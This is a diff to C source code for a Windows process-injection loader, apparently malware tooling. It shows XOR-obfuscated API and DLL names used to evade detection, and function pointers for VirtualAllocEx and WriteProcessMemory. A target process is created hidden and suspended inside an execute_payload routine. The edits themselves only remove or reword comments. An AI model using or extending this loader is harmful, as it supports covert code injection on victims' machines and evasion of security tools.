@@ -3,7 +3,7 @@
 #include "evasion.h"
 #include <stdio.h>
 
-// used to cast generic API function pointer (FARPROC)
+// --- typedefs definition
 typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
@@ -33,7 +33,6 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     // kernel32.dll
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len); 
 
     if (!hKernel32) return false;
@@ -65,7 +64,6 @@ bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
     // NOTE: use CREATE_NO_WINDOW flag to not show GUI
     // NOTE: use CREATE_SUSPENDED flag to not end process early
     bool proc_created = fnCreateProcessA(NULL, enc_target_process, NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);    
-    // OPSEC: recypher
     xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
 
     if (!proc_created) return false;
